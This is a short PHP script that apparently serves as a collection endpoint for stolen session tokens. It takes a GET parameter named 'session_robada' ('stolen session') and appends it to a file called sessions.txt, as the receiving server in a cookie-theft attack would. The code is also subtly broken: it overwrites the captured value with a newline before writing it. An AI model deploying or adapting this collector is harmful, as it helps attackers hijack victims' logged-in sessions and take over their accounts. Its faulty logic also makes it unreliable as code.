<?php
$session_robada = $_GET['session_robada'] ?? "";
$session_robada = "\n";
$fichero = 'sessions.txt';
//
$actual = file_get_contents($fichero);
file_put_contents($fichero, $session_robada, FILE_APPEND);

?>